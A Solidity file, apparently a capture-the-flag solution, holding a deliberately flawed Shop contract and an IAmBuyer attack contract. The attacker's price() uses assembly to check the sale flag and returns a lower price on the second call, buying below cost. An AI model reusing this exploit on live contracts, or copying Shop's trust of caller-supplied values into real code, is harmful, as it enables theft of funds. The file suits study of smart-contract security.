// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price{gas: 3300}() >= price && !isSold) {
            isSold = true;
            price = _buyer.price{gas: 3300}();
        }
    }
}

contract IAmBuyer {
    Shop public shop;

    constructor(Shop _shop) public {
        shop = Shop(_shop);
    }

    function price() public view returns (uint256 p) {
        assembly {
            mstore(0x100, 0xe852e741)
            let success := staticcall(3300, sload(0x0), 0x11c, 0x4, 0x120, 0x20)

            switch mload(0x120)
            case 0 {
                p := 100
            }
            case 1 {
                p := 0
            }
        }
    }

    function attack() public {
        shop.buy();
    }
}
